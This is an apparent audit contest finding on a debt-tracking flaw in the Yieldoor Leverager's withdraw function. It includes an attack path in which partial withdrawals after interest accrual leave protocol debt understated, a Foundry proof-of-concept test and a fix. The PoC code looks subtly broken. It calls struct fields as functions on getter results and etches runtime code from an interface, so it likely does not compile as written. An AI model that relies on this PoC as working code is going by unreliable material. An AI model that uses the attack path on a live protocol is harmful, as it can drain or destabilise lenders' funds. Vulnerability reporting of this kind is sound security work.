# Attacker will cause insolvency for protocol by exploiting debt tracking flaw in withdraw

### Summary

The use of an outdated debt value in withdraw will cause an insolvency risk for the protocol as an attacker will partially withdraw their position to understate tracked debt, breaking the invariant currBorrowedUSD >= sum(initBorrowedUsd).

### Root Cause

In Leverager.sol:285-287 the debt tracking updates use initBorrowedUsd instead of totalOwedAmount, understating debt as interest accrues.
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Leverager.sol#L285-L287

### Internal Pre-conditions

User needs to call openLeveragedPosition to set initBorrowedUsd to be at least 100 USDC (or any significant amount).
LendingPool needs to accrue interest to set bIndex to go from 1e18 to at least 2e18 (doubling over time).

### External Pre-conditions

No external preconditions required,the issue relies solely on internal state changes.

### Attack Path

User calls openLeveragedPosition to borrow 100 USDC, setting initBorrowedUsd = 100 and currBorrowedUSD = 100.
Interest accrues in LendingPool, doubling bIndex so totalOwedAmount = 200 while initBorrowedUsd remains 100.
User calls withdraw with wp.pctWithdraw = 0.5e18 (50%), repaying 100 USDC (totalOwedAmount * 0.5), but reducing currBorrowedUSD by 50 (initBorrowedUsd * 0.5) to 50.
Protocol tracks 50 USDC debt, while actual remaining debt is 100 USDC, leaving 50 USDC unaccounted.

### Impact

The protocol suffers an approximate loss of 50% of borrowed funds per exploited position. The attacker gains nothing directly but leaves the protocol insolvent by under-repaying true debt.

### PoC

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../Leverager.sol";
import "../LendingPool.sol";

contract DebtTrackingPoC is Test {
    Leverager leverager;
    LendingPool lendingPool;
    address user = address(0x1);
    address usdc = address(0x2); // Mock USDC

    function setUp() public {
        lendingPool = new LendingPool();
        leverager = new Leverager("Leverager", "LEV", address(lendingPool));
        vm.etch(usdc, abi.encodePacked(type(IERC20).runtimeCode)); // Mock ERC20
        deal(usdc, user, 1000e18); // Fund user
        vm.startPrank(user);
        IERC20(usdc).approve(address(leverager), type(uint256).max);
        vm.stopPrank();
    }

    function testDebtTrackingFlaw() public {
        vm.startPrank(user);
        Leverager.LeverageParams memory lp = Leverager.LeverageParams({
            vault: address(0x3),
            amount0In: 0,
            amount1In: 0,
            vault0In: 0,
            vault1In: 0,
            min0in: 0,
            min1in: 0,
            denomination: usdc,
            maxBorrowAmount: 100e18,
            swapParams1: "",
            swapParams2: ""
        });
        uint256 id = leverager.openLeveragedPosition(lp);
        assertEq(leverager.vaultParams(address(0x3)).currBorrowedUSD(), 100e18);

        vm.mockCall(
            address(lendingPool),
            abi.encodeWithSelector(ILendingPool.getCurrentBorrowingIndex.selector, usdc),
            abi.encode(2e18) // bIndex doubles
        );

        Leverager.WithdrawParams memory wp = Leverager.WithdrawParams({
            id: id,
            pctWithdraw: 0.5e18,
            minAmount0: 0,
            minAmount1: 0,
            hasToSwap: false,
            swapParams1: "",
            swapParams2: ""
        });
        leverager.withdraw(wp);

        uint256 currBorrowedUSD = leverager.vaultParams(address(0x3)).currBorrowedUSD();
        uint256 initBorrowedUsd = leverager.positions(id).initBorrowedUsd();
        assertEq(currBorrowedUSD, 50e18); // Tracked debt
        assertEq(initBorrowedUsd, 50e18); // Position debt
        // Actual debt = 100 USDC, invariant broken (50 < 100)
    }
}

### Mitigation

Update currBorrowedUSD and initBorrowedUsd reductions in withdraw to use totalOwedAmount * wp.pctWithdraw / 1e18 instead of initBorrowedUsd * wp.pctWithdraw / 1e18, ensuring debt reflects interest-adjusted values.
